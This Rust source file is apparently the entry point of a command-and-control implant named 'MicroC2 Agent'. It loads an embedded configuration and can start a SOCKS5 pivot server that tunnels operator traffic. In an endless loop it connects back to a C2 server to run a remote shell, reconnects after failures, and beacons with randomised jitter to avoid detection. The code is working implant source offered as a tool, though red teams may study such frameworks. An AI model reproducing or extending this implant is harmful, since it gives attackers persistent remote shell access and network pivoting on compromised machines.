mod commands;
mod config;
mod networking;

use commands::command_shell::run_shell;
use config::AgentConfig;
use std::env;
use std::time::Duration;
use tokio::time;
use rand::Rng;
use log::{info, warn, error};
use networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{detect_opsec_level, OpsecLevel};
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    println!("[STARTUP] MicroC2 Agent starting...");
    
    let config = AgentConfig::load()?; // Make sure this returns the right error type
    info!("[CONFIG] Loaded agent config: {:?}", config);

    // Channel for pivot frames
    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);

        // Start SOCKS5 pivot server for operator-side pivoting
        let pivot_server = Socks5PivotServer::new(
            config.socks5_host.clone(),
            config.socks5_port,
            pivot_tx.clone(),
        );
        let pivot_handler_clone = pivot_handler.clone();
        tokio::spawn(async move {
            pivot_server.run(pivot_handler_clone).await;
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    // Spawn pivot frame handler in background
    let pivot_handler_bg = pivot_handler.clone();
    tokio::spawn(async move {
        while let Some(frame) = pivot_rx.recv().await {
            pivot_handler_bg.lock().await.handle_frame(frame).await;
        }
    });

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    println!("[INFO] Using embedded configuration");

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
    loop {
        info!("[NETWORK] Attempting connection to C2: {}", server_addr);
        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
            error!("[ERROR] Shell error: {}. Retrying...", e);
            time::sleep(Duration::from_secs(5)).await;
        }
        
        let mut rng = rand::thread_rng();
        let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
        info!("[AGENT] Sleeping for {} seconds before next attempt", sleep_time);
        time::sleep(Duration::from_secs(sleep_time)).await;
    }
}
